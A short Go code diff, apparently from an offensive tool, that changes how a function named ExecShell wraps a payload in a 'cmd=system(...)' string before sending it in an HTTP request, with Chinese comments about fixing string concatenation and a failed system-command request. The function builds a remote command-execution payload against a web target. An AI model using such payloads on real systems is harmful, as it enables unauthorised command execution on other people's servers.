@@ -9,7 +9,7 @@ import (
 )
 
 func ExecShell(payload string) (*string, error) {
-	shellPayload := "cmd=system('" + payload + "');" // 修改此行，修复字符串拼接问题
+	shellPayload := fmt.Sprintf("cmd=system('%s');", payload)
 	respShell, err := http.MakeRequest(shellPayload)
 	{
 		util.HandleError(err, "请求执行系统命令失败")
